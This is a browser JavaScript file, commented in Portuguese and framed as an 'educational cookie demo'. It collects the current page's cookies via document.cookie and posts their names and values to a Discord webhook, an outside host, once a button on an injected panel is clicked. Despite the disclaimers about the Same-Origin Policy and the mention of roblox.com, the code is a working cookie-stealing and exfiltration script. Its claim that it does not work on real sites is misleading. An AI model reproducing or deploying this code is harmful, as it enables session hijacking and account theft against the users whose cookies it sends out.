// === CÓDIGO EDUCATIVO - APENAS PARA ESTUDO ===
// Este código demonstra como cookies funcionam em um contexto controlado
// Não funciona em sites reais devido à Same-Origin Policy

(function() {
    'use strict';
    
    // CONFIGURAÇÃO (use um servidor de teste local)
    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/SEU_WEBHOOK_AQUI';
    
    // 1. Função para coletar cookies (apenas do domínio atual)
    function collectCookies() {
        try {
            const cookies = document.cookie;
            
            if (!cookies) {
                return "Nenhum cookie encontrado neste domínio.";
            }
            
            // Parse dos cookies
            const cookieArray = cookies.split('; ');
            const cookieObj = {};
            
            cookieArray.forEach(cookie => {
                const [name, ...valueParts] = cookie.split('=');
                const value = valueParts.join('='); // Para valores com '='
                cookieObj[name] = decodeURIComponent(value);
            });
            
            return {
                domain: window.location.hostname,
                totalCookies: cookieArray.length,
                cookies: cookieObj,
                raw: cookies
            };
        } catch (error) {
            return { error: error.message };
        }
    }
    
    // 2. Função para enviar ao Discord com formatação bonita
    async function sendToDiscord(cookieData) {
        if (!DISCORD_WEBHOOK_URL.includes('discord.com')) {
            console.error('Webhook URL inválida');
            return false;
        }
        
        try {
            // Criar mensagem formatada para Discord
            const message = {
                username: "🍪 Cookie Monitor Educacional",
                avatar_url: "https://cdn-icons-png.flaticon.com/512/835/835830.png",
                embeds: [{
                    title: "📊 Relatório de Cookies - Demonstração Educacional",
                    description: "**AVISO:** Esta é uma demonstração educacional.\nCookies só podem ser acessados no mesmo domínio por questões de segurança.",
                    color: 0xFFA500, // Laranja
                    fields: [
                        {
                            name: "🌐 Domínio Atual",
                            value: `\`${cookieData.domain || window.location.hostname}\``,
                            inline: true
                        },
                        {
                            name: "🍪 Total de Cookies",
                            value: `**${cookieData.totalCookies || 0}** cookies`,
                            inline: true
                        },
                        {
                            name: "📅 Data/Hora",
                            value: new Date().toLocaleString('pt-BR'),
                            inline: true
                        }
                    ],
                    footer: {
                        text: "Fins Educacionais • Same-Origin Policy"
                    },
                    timestamp: new Date().toISOString()
                }]
            };
            
            // Adicionar cookies individuais se existirem
            if (cookieData.cookies && Object.keys(cookieData.cookies).length > 0) {
                message.embeds[0].fields.push({
                    name: "📝 Cookies Detectados",
                    value: Object.entries(cookieData.cookies)
                        .map(([key, value]) => `• **${key}**: \`${value.length > 50 ? value.substring(0, 50) + '...' : value}\``)
                        .join('\n'),
                    inline: false
                });
            }
            
            // Enviar para o Discord
            const response = await fetch(DISCORD_WEBHOOK_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(message)
            });
            
            if (response.ok) {
                console.log('✅ Demonstração enviada para Discord!');
                return true;
            } else {
                console.error('❌ Erro ao enviar:', await response.text());
                return false;
            }
            
        } catch (error) {
            console.error('❌ Erro na requisição:', error);
            return false;
        }
    }
    
    // 3. Demonstração prática (funciona apenas no mesmo domínio)
    function educationalDemo() {
        console.log('=== DEMONSTRAÇÃO EDUCATIVA DE COOKIES ===');
        
        // Criar um cookie de exemplo para demonstrar
        document.cookie = "educational_demo=true; path=/; max-age=3600";
        document.cookie = "username=Estudante; path=/; max-age=3600";
        
        const cookies = collectCookies();
        
        console.log('📋 Cookies do domínio atual:');
        console.table(cookies.cookies || {});
        
        // Mostrar alerta educacional
        alert('🚨 AVISO EDUCACIONAL:\n\nEsta demonstração mostra como os cookies funcionam.\n\nNa realidade:\n• Não é possível acessar cookies de outros sites (roblox.com)\n• Isso é bloqueado pela "Same-Origin Policy"\n• Acessar cookies sem permissão é antiético e ilegal');
        
        return cookies;
    }
    
    // 4. Interface do usuário (opcional)
    function createEducationalUI() {
        const style = document.createElement('style');
        style.textContent = `
            .cookie-educational-panel {
                position: fixed;
                bottom: 20px;
                right: 20px;
                background: #2c3e50;
                color: white;
                padding: 15px;
                border-radius: 10px;
                box-shadow: 0 4px 6px rgba(0,0,0,0.1);
                z-index: 10000;
                font-family: Arial, sans-serif;
                max-width: 300px;
            }
            .cookie-educational-panel h3 {
                margin-top: 0;
                color: #3498db;
            }
            .cookie-educational-btn {
                background: #e74c3c;
                color: white;
                border: none;
                padding: 8px 16px;
                border-radius: 5px;
                cursor: pointer;
                margin-top: 10px;
                width: 100%;
            }
            .cookie-educational-btn:hover {
                background: #c0392b;
            }
        `;
        document.head.appendChild(style);
        
        const panel = document.createElement('div');
        panel.className = 'cookie-educational-panel';
        panel.innerHTML = `
            <h3>🍪 Demonstração Educacional</h3>
            <p>Este script demonstra como cookies funcionam.</p>
            <p><strong>Limitação:</strong> Não pode acessar cookies de outros sites devido à política de segurança do navegador.</p>
            <button class="cookie-educational-btn" id="runDemo">Executar Demonstração</button>
        `;
        
        document.body.appendChild(panel);
        
        document.getElementById('runDemo').addEventListener('click', async () => {
            const cookies = educationalDemo();
            await sendToDiscord(cookies);
            alert('✅ Demonstração concluída!\nVerifique o console do navegador (F12) para detalhes.');
        });
    }
    
    // 5. Inicialização
    console.log(`
    ===========================================
    DEMONSTRAÇÃO EDUCATIVA DE COOKIES
    ===========================================
    Este código é apenas para fins educacionais.
    
    IMPORTANTE:
    1. Same-Origin Policy impede acesso a cookies de outros sites
    2. Acessar cookies sem permissão é antiético e ilegal
    3. Este código só funciona no domínio atual
    
    Para aprender mais sobre segurança web:
    • MDN Web Docs: https://developer.mozilla.org
    • OWASP Security: https://owasp.org
    ===========================================
    `);
    
    // Criar interface educacional
    if (document.body) {
        createEducationalUI();
    } else {
        document.addEventListener('DOMContentLoaded', createEducationalUI);
    }
    
    // Disponibilizar funções para estudo
    window.CookieEducationalDemo = {
        collectCookies,
        sendToDiscord,
        educationalDemo,
        version: '1.0.0-educational'
    };
    
})();